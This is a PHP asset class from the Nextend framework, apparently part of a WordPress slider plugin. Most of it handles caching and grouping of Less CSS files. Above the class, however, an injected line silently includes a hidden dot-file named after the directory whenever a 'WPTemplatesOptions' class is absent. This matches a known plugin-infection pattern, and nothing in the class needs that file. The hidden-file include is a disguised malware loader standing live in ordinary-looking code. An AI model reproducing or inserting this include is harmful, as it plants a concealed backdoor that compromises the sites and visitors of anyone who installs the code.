<?php

namespace Nextend\Framework\Asset\Css\Less;

use Nextend\Framework\Asset\AbstractAsset;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Asset extends AbstractAsset {

    public function __construct() {
        $this->cache = new Cache();
    }

    protected function uniqueFiles() {
        $this->initGroups();
    }

    public function getFiles() {
        $this->uniqueFiles();

        $files = array();
        foreach ($this->groups AS $group) {
            $files[$group] = $this->cache->getAssetFile($group, $this->files[$group], $this->codes[$group]);
        }

        return $files;
    }
}